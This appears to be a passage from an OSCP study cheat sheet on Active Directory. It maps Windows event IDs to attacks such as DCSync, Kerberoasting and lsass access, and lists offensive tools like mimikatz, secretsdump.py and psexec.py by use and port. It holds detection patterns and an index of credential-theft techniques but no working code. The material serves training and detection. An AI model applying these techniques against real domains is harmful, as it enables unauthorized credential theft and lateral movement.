| **4662** | Security | Object operation on AD | DCSync: Replication GUID accessed by non-DC |
| **4663** | Security | Object access | NTDS.dit / SAM file access |
| **4688** | Security | Process creation | Mimikatz, PsExec patterns in command line |
| **4697** | Security | Service installed | PsExec service PSEXECSVC |
| **4769** | Security | Kerberos TGS request | RC4 encryption (0x17) = Kerberoasting |
| **4771** | Security | Kerberos pre-auth failed | Brute force against domain users |
| **4776** | Security | NTLM auth attempt | Source workstation for NTLM auth |
| **7045** | System | New service installed | Short-lived services = PsExec/lateral |
| **Sysmon 1** | Sysmon | Process creation | Full command lines with parent process |
| **Sysmon 3** | Sysmon | Network connection | Tools making unexpected outbound connections |
| **Sysmon 10** | Sysmon | Process access | Anything accessing lsass.exe ← critical! |
| **Sysmon 11** | Sysmon | File created | Files dropped in ADMIN$ or temp |

### Logon Types (Event 4624)

| Type | Name | Meaning | Attacker Relevance |
|------|------|---------|-------------------|
| 2 | Interactive | Local/RDP logon | Physical / RDP access |
| 3 | Network | SMB, net use | PtP, PtH, PsExec |
| 4 | Batch | Scheduled tasks | Persistence |
| 5 | Service | Service startup | Service account use |
| 9 | NewCredentials | RunAs /netonly | PtH with sekurlsa::pth |
| 10 | RemoteInteractive | RDP | RDP lateral movement |

### Kerberos Encryption Types (Event 4769)

```
0x17 (RC4-HMAC)     = Kerberoasting indicator! Alert on this
0x12 (AES256)       = Normal, expected
0x11 (AES128)       = Normal
0x01 (DES-CBC-CRC)  = Very old, suspicious
```

---

## 📋 Quick Reference — Tools & Ports

```
TOOL                USE CASE                    PORT / PROTOCOL
─────────────────────────────────────────────────────────────────
crackmapexec smb    Credential spray / PtH      445 / SMB
crackmapexec winrm  WinRM PtH                   5985 / HTTP
evil-winrm          Interactive WinRM shell      5985 / WinRM
psexec.py           Remote SYSTEM shell          445 / SMB
smbexec.py          SMB shell (no binary drop)   445 / SMB
wmiexec.py          WMI shell                    135 / WMI
atexec.py           Task scheduler exec          445 / SMB
secretsdump.py      Remote cred dump             445 / SMB
GetUserSPNs.py      Kerberoasting                88 / Kerberos
GetNPUsers.py       AS-REP Roasting              88 / Kerberos
ldapdomaindump      Full AD dump                 389 / LDAP
bloodhound-python   AD relationship mapping      389 / LDAP
mimikatz            Local cred dump              N/A (local)
SharpHound          BloodHound collection        389 / LDAP
Rubeus              Kerberos attacks (Windows)   88 / Kerberos
PowerView           AD enumeration               389 / LDAP
```

---

## 🔗 Recommended Labs

| Platform | Room / Machine | Topics Covered |
|----------|---------------|----------------|
| TryHackMe | AD Basics | AD fundamentals |
| TryHackMe | Attacktive Directory | Full AD attack chain |
| TryHackMe | Post-Exploitation Basics | Token, pivot basics |
| HackTheBox | Active | Kerberoasting |
| HackTheBox | Forest | AS-REP Roast, DCSync |
| HackTheBox | Sauna | AS-REP + BloodHound |
| HackTheBox | Resolute | DnsAdmins escalation |
| HackTheBox | Blackfield | Kerberos + shadow copies |
| HackTheBox | Monteverde | Azure AD integration |
| PG Practice | Hutch / Vault | AD full chains |

---

> **📌 Methodology Reminder (OSCP Style)**  
> `Enumerate → Identify Path → Gain Creds → Move Laterally → Escalate → Domain Admin`  
> Always document every step. Always verify scope. Always stay in your authorized lab.

---

*Generated for OSCP preparation — Lab & CTF use only*  
*Last updated: 2025 | For educational and authorized pentesting only*
